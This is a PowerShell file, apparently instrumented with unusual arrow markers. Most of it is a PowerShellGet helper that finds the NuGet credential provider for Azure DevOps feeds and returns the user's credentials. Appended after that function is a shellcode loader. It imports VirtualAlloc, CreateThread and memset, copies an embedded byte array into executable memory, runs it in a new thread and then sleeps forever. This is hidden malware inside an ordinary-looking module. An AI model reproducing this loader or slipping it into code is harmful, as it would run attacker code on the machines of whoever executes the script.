
 -||-> function Get-CredsFromCredentialProvider {
    [CmdletBinding()]
    Param
    (
        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [Uri]
        $SourceLocation,

        [Parameter()]
        [bool]
        $isRetry = $false
    )


     -||-> Write-Verbose "PowerShellGet Calling 'CallCredProvider' on $SourceLocation" <-||- 
    
     -||-> $regex = [regex] '^(\S*pkgs.dev.azure.com\S*/v2)$|^(\S*pkgs.visualstudio.com\S*/v2)$' <-||- 

     -||-> if ( -||-> !( -||-> $SourceLocation -match $regex <-||- ) <-||- ) {
        return  -||-> $null <-||- ;
    } <-||- 

    
    
    
    
    
     -||-> $credProviderPath = $null <-||- 
     -||-> $defaultEnvPath = "NUGET_PLUGIN_PATHS" <-||- 
     -||-> $nugetPluginPath =  -||-> Get-Childitem env:$defaultEnvPath -ErrorAction SilentlyContinue <-||-  <-||- 
     -||-> $callDotnet = $true <-||- ;

     -||-> if ( -||-> $nugetPluginPath -and $nugetPluginPath.value <-||- ) {
        
        
         -||-> $credProviderPath = $nugetPluginPath.value <-||- 
         -||-> $extension = $credProviderPath.Substring($credProviderPath.get_Length() - 4) <-||- 
         -||-> if ( -||-> $extension -eq ".exe" <-||- ) {
             -||-> $callDotnet = $false <-||- 
        } <-||- 
    }
    else {
        
         -||-> $path = "$( -||-> $env:UserProfile <-||- )/.nuget/plugins/netcore/CredentialProvider.Microsoft/CredentialProvider.Microsoft.dll" <-||- ;

         -||-> if ( -||-> $script:IsLinux -or $script:IsMacOS <-||- ) {
             -||-> $path = "$( -||-> $HOME <-||- )/.nuget/plugins/netcore/CredentialProvider.Microsoft/CredentialProvider.Microsoft.dll" <-||- ;
        } <-||- 
         -||-> if ( -||-> Test-Path $path -PathType Leaf <-||- ) {
             -||-> $credProviderPath = $path <-||- 
        } <-||- 
    } <-||- 

    
    
    
    
     -||-> if ( -||-> !$credProviderPath -and $script:IsWindows <-||- ) {
         -||-> if ( -||-> ${Env:ProgramFiles(x86)} <-||- ) {
             -||-> $programFiles = ${Env:ProgramFiles(x86)} <-||- 
        }
        elseif ( -||-> $Env:Programfiles <-||- ) {
             -||-> $programFiles = $Env:Programfiles <-||- 
        }
        else {
            return  -||-> $null <-||- 
        } <-||- 

         -||-> $vswhereExePath = "$( -||-> $programFiles <-||- )\\Microsoft Visual Studio\\Installer\\vswhere.exe" <-||- 
         -||-> if ( -||-> !( -||-> Test-Path $vswhereExePath -PathType Leaf <-||- ) <-||- ) {
            return  -||-> $null <-||- 
        } <-||- 

         -||-> $RedirectedOutput =  -||-> Join-Path ( -||-> [System.IO.Path]::GetTempPath() <-||- ) 'RedirectedOutput.txt' <-||-  <-||- 
         -||-> Start-Process $vswhereExePath `
            -Wait `
            -WorkingDirectory $PSHOME `
            -RedirectStandardOutput $RedirectedOutput `
            -NoNewWindow <-||- 

         -||-> $content =  -||-> Get-Content $RedirectedOutput <-||-  <-||- 
         -||-> Remove-Item $RedirectedOutput -Force -Recurse -ErrorAction SilentlyContinue <-||- 

         -||-> $vsInstallationPath = "" <-||- 
         -||-> if ( -||-> [System.Text.RegularExpressions.Regex]::IsMatch($content, "installationPath") <-||- ) {
             -||-> $vsInstallationPath = [System.Text.RegularExpressions.Regex]::Match($content, "(?<=installationPath: ).*(?= installationVersion:)") <-||- ;
             -||-> $vsInstallationPath = $vsInstallationPath.ToString() <-||- 
        } <-||- 

        
        
         -||-> if ( -||-> $vsInstallationPath <-||- ) {
             -||-> $credProviderPath = ( -||-> $vsInstallationPath + '\Common7\IDE\CommonExtensions\Microsoft\NuGet\Plugins\CredentialProvider.Microsoft\CredentialProvider.Microsoft.exe' <-||- ) <-||- 
             -||-> if ( -||-> !( -||-> Test-Path $credProviderPath -PathType Leaf <-||- ) <-||- ) {
                return  -||-> $null <-||- 
            } <-||- 
             -||-> $callDotnet = $false <-||- ;
        } <-||- 
    } <-||- 

     -||-> if ( -||-> !( -||-> Test-Path $credProviderPath -PathType Leaf <-||- ) <-||- ) {
        return  -||-> $null <-||- 
    } <-||- 

     -||-> $filename = $credProviderPath <-||- 
     -||-> $arguments = "-U $SourceLocation" <-||- 
     -||-> if ( -||-> $callDotnet <-||- ) {
         -||-> $filename = "dotnet" <-||- 
         -||-> $arguments = "$credProviderPath $arguments" <-||- 
    } <-||- 
     -||-> $argumentsNoRetry = $arguments <-||- 
     -||-> if ( -||-> $isRetry <-||- ) {
         -||-> $arguments = "$arguments -I" <-||- ;
         -||-> Write-Debug "Credential provider is re-running with -IsRetry" <-||- 
    } <-||- 

     -||-> Write-Debug "Credential provider path is: $credProviderPath" <-||- 
    
    
     -||-> Start-Process $filename -ArgumentList "$arguments -V minimal" `
        -Wait `
        -WorkingDirectory $PSHOME `
        -NoNewWindow <-||- 

    
     -||-> $RedirectedOutput =  -||-> Join-Path ( -||-> [System.IO.Path]::GetTempPath() <-||- ) 'RedirectedOutput.txt' <-||-  <-||- 
     -||-> Start-Process $filename -ArgumentList "$argumentsNoRetry -V verbose" `
        -Wait `
        -WorkingDirectory $PSHOME `
        -RedirectStandardOutput $RedirectedOutput `
        -NoNewWindow <-||- 

     -||-> $content =  -||-> Get-Content $RedirectedOutput <-||-  <-||- 
     -||-> Remove-Item $RedirectedOutput -Force -Recurse -ErrorAction SilentlyContinue <-||- 

     -||-> $username = [System.Text.RegularExpressions.Regex]::Match($content, '(?<=Username: )\S*') <-||- 
     -||-> $password = [System.Text.RegularExpressions.Regex]::Match($content, '(?<=Password: ).*') <-||- 

     -||-> if ( -||-> $username -and $password <-||- ) {
         -||-> $secstr =  -||-> ConvertTo-SecureString $password -AsPlainText -Force <-||-  <-||- 
         -||-> $credential =  -||-> new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr <-||-  <-||- 

        return  -||-> $credential <-||- 
    } <-||- 

    return  -||-> $null <-||- 
} <-||- 

 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xba,0xe8,0xd1,0xdc,0x30,0xdb,0xdb,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0xb1,0x47,0x31,0x53,0x13,0x83,0xeb,0xfc,0x03,0x53,0xe7,0x33,0x29,0xcc,0x1f,0x31,0xd2,0x2d,0xdf,0x56,0x5a,0xc8,0xee,0x56,0x38,0x98,0x40,0x67,0x4a,0xcc,0x6c,0x0c,0x1e,0xe5,0xe7,0x60,0xb7,0x0a,0x40,0xce,0xe1,0x25,0x51,0x63,0xd1,0x24,0xd1,0x7e,0x06,0x87,0xe8,0xb0,0x5b,0xc6,0x2d,0xac,0x96,0x9a,0xe6,0xba,0x05,0x0b,0x83,0xf7,0x95,0xa0,0xdf,0x16,0x9e,0x55,0x97,0x19,0x8f,0xcb,0xac,0x43,0x0f,0xed,0x61,0xf8,0x06,0xf5,0x66,0xc5,0xd1,0x8e,0x5c,0xb1,0xe3,0x46,0xad,0x3a,0x4f,0xa7,0x02,0xc9,0x91,0xef,0xa4,0x32,0xe4,0x19,0xd7,0xcf,0xff,0xdd,0xaa,0x0b,0x75,0xc6,0x0c,0xdf,0x2d,0x22,0xad,0x0c,0xab,0xa1,0xa1,0xf9,0xbf,0xee,0xa5,0xfc,0x6c,0x85,0xd1,0x75,0x93,0x4a,0x50,0xcd,0xb0,0x4e,0x39,0x95,0xd9,0xd7,0xe7,0x78,0xe5,0x08,0x48,0x24,0x43,0x42,0x64,0x31,0xfe,0x09,0xe0,0xf6,0x33,0xb2,0xf0,0x90,0x44,0xc1,0xc2,0x3f,0xff,0x4d,0x6e,0xb7,0xd9,0x8a,0x91,0xe2,0x9e,0x05,0x6c,0x0d,0xdf,0x0c,0xaa,0x59,0x8f,0x26,0x1b,0xe2,0x44,0xb7,0xa4,0x37,0xf0,0xb2,0x32,0x78,0xad,0xbc,0xcd,0x10,0xac,0xbe,0xc0,0xbc,0x39,0x58,0xb2,0x6c,0x6a,0xf5,0x72,0xdd,0xca,0xa5,0x1a,0x37,0xc5,0x9a,0x3a,0x38,0x0f,0xb3,0xd0,0xd7,0xe6,0xeb,0x4c,0x41,0xa3,0x60,0xed,0x8e,0x79,0x0d,0x2d,0x04,0x8e,0xf1,0xe3,0xed,0xfb,0xe1,0x93,0x1d,0xb6,0x58,0x35,0x21,0x6c,0xf6,0xb9,0xb7,0x8b,0x51,0xee,0x2f,0x96,0x84,0xd8,0xef,0x69,0xe3,0x53,0x39,0xfc,0x4c,0x0b,0x46,0x10,0x4d,0xcb,0x10,0x7a,0x4d,0xa3,0xc4,0xde,0x1e,0xd6,0x0a,0xcb,0x32,0x4b,0x9f,0xf4,0x62,0x38,0x08,0x9d,0x88,0x67,0x7e,0x02,0x72,0x42,0x7e,0x7e,0xa5,0xaa,0xf4,0x6e,0x75 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



